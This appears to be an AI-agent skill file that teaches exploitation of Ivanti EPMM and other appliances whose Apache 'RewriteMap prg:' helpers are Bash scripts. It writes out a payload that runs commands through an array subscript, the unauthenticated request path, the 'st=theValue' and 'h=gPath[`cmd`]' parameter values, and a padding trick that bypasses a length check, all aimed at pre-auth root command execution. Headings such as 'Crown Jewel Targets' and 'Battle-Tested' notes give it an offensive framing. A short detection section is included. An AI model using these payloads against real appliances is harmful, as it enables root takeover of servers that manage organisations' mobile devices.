---
name: bash-rewritemap-injection
description: "Exploit Apache `RewriteMap prg:` handlers backed by Bash scripts, where arithmetic expansion turns a crafted URL into pre-auth root command execution. Use when testing Ivanti EPMM/MDM or any appliance whose Apache configuration pipes request data into a shell script helper."
---

# Bash Arithmetic Expansion & RewriteMap Command Injection

## Crown Jewel Targets

- Ivanti Endpoint Manager Mobile (EPMM) — all current versions, CISA KEV
- Any appliance using Apache `RewriteMap prg:` with Bash shell scripts
- Pulse Secure/Ivanti MDM product family
- Appliances with unauthenticated app store endpoints
- Apache servers with persistent shell-script RewriteMap configurations

## Attack Surface Signals

- Ivanti EPMM: `/mifs/c/appstore/fob/` paths
- Apache config: `RewriteMap prg:` directives pointing to shell scripts
- URL parameters with `st=`, `h=` containing variable references
- Backtick characters (`%60`) or `$()` in URL parameters
- MDM/UEM appliance login pages

**Sources:** WatchTowr Labs (Ivanti EPMM, 2026)
**CVEs:** CVE-2026-1281, CVE-2026-1340 (CISA KEV, actively exploited)
**Affected:** Ivanti Endpoint Manager Mobile (all current versions)

## Overview

Apache `RewriteMap prg:` directives pipe URL path components into persistent shell scripts. When these scripts use Bash arithmetic comparisons on user-controlled input, Bash's array subscript evaluation executes arbitrary commands.

## Core Mechanism

Bash arithmetic expansion (`[[ $a -gt $b ]]`, `$(( ))`) evaluates array subscripts as expressions:

```bash
# Executes `id` when Bash evaluates the array index
var[`id > /tmp/pwned`]=1
```

## Ivanti EPMM Exploitation

### Variable Indirection Chain

```
$gStartTime -> "theValue" -> $theValue -> "gPath[`id > /mi/poc`]"
```

When Bash evaluates `[[ $current -gt $gStartTime ]]`:
1. `$gStartTime` = `theValue` (a variable name)
2. Bash dereferences: `$theValue` = `gPath[\`id\`]`
3. Array subscript executes backtick command **as root**

### Exploit Entry Point

```
GET /mifs/c/appstore/fob/3/<encoded_payload>
```

Key parameters: `st=theValue` (sets variable name), `h=gPath[\`cmd\`]` (sets payload).
Length check bypass: trailing space padding.

## Detection

```bash
grep -r "RewriteMap.*prg:" /etc/httpd/ /etc/apache2/
```

URL indicators: backticks (`%60`), `$()`, `theValue` in `st=`, array brackets in params.

## Testing Methodology

1. Find `RewriteMap prg:` in Apache configs
2. Read the target shell script to identify variable flow
3. Test arithmetic expansion: `$((7*7))`
4. Test command substitution in array subscripts
5. Test variable indirection chains

## RewriteMap Directive Risk Levels

| Directive | Risk |
|-----------|------|
| `RewriteMap prg:` (shell script) | CRITICAL |
| `RewriteMap txt:` (static file) | Low |
| `RewriteMap dbm:` (database) | Low |
| `RewriteMap int:` (internal) | None |

## Bug Bounty Relevance

- **CRITICAL**: Pre-auth RCE as root on MDM/UEM appliances
- MDM app store endpoints are unauthenticated by design
- Ivanti/Pulse products commonly use RewriteMap prg:
- Actively exploited in the wild (CISA KEV)

## Operator Notes (Battle-Tested)

- **Only `RewriteMap prg:` (shell script) is dangerous**: `txt:` (static file), `dbm:` (database), `int:` (internal) are not exploitable. Check Apache configs for `prg:` specifically.
- **Bash array subscript is the injection vector**: `var[\`id\`]=1` — Bash evaluates the backtick command when processing array subscripts in arithmetic context. This is a Bash feature, not a bug.
- **Variable indirection chain amplifies**: `$gStartTime` -> `"theValue"` -> `$theValue` -> `"gPath[\`cmd\`]"`. Multiple levels of indirection make the vulnerability non-obvious in code review.
- **MDM app store endpoints are unauthenticated**: App store browsing is by design unauthenticated — users need to download apps before enrolling. This provides the pre-auth attack surface.
- **Actively exploited (CISA KEV)**: CVE-2026-1281/1340 are in the Known Exploited Vulnerabilities catalog. High-priority for bug bounty — programs are actively patching.
- **Length check bypass via padding**: Trailing space padding bypasses minimum length checks on the payload parameter.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `appliance-management-attacks` | General appliance exploitation |
| `spring-el-injection` | Alternative RCE on Ivanti EPMM |
| `command-injection-testing` | General command injection |
| `ssl-vpn-testing` | VPN appliance attack surface |
| `python-pth-execution` | Alternative RCE on Python appliances |
